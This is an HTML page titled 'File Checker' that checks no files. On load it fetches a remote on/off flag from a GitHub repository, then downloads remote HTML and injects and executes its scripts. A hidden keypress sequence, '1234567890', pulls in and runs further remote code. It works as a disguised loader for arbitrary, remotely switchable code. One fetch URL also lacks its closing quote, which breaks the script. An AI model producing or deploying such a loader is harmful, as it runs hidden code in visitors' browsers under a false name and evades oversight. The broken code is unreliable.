<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Checker</title>
    <style>
        body {
            background-image: url('https://wallpapercave.com/wp/wp8254586.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <div class="container">
        <p id="status">Loading...</p>
    </div>

    <script>
        let offCodeRunning = false;

        function runCustomCode(htmlContent, isOn) {
            // Remove the existing content
            document.body.innerHTML = '';

            // Create a container to hold the new HTML content
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = htmlContent;

            // Extract and execute scripts from the fetched HTML
            const scripts = tempDiv.querySelectorAll('script');
            scripts.forEach(script => {
                const newScript = document.createElement('script');
                newScript.type = 'text/javascript';
                if (script.src) {
                    newScript.src = script.src;
                } else {
                    newScript.text = script.textContent;
                }
                document.body.appendChild(newScript);
                script.remove();
            });

            // Append the remaining HTML content to the body
            document.body.appendChild(tempDiv);

            if (!isOn) {
                // Add a listener for the specific key sequence when off code is running
                offCodeRunning = true;
                let inputSequence = '';
                document.addEventListener('keydown', function(event) {
                    inputSequence += event.key;
                    if (inputSequence.includes('1234567890')) {
                        inputSequence = ''; // Reset sequence
                        if (offCodeRunning) {
                            offCodeRunning = false;
                            // Fetch and run the on code
                            fetch('https://raw.githubusercontent.com/rootedhash/rootedhash/refs/heads/main/customCodeOn.html')
                                .then(response => response.text())
                                .then(html => {
                                    runCustomCode(html, true);
                                })
                                .catch(error => console.error('Error fetching custom code:', error));
                        }
                    }
                });
            }
        }

        fetch('https://raw.githubusercontent.com/rootedhash/rootedhash/refs/heads/main/enduser.txt')
            .then(response => response.text())
            .then(text => {
                if (text.trim() === 'on') {
                    console.log('File status is ON. Fetching custom code...');
                    fetch('https://raw.githubusercontent.com/rootedhash/rootedhash/refs/heads/main/dontdownloadthis.html')
                        .then(response => response.text())
                        .then(html => {
                            runCustomCode(html, true);
                        })
                        .catch(error => {
                            console.error('Error fetching custom code:', error);
                            document.getElementById('status').textContent = 'Error fetching custom code';
                        });
                } else if (text.trim() === 'off') {
                    console.log('File status is OFF. Fetching custom code...');
                    fetch('https://raw.githubusercontent.com/rootedhash/rootedhash/refs/heads/main/accesspausedforsafety.html)
                        .then(response => response.text())
                        .then(html => {
                            runCustomCode(html, false);
                        })
                        .catch(error => {
                            console.error('Error fetching custom code:', error);
                            document.getElementById('status').textContent = 'Error fetching custom code';
                        });
                } else {
                    document.getElementById('status').textContent = 'Unrecognized content';
                }
            })
            .catch(error => {
                document.getElementById('status').textContent = 'Error fetching file';
                console.error('Error:', error);
            });
    </script>
</body>
</html>
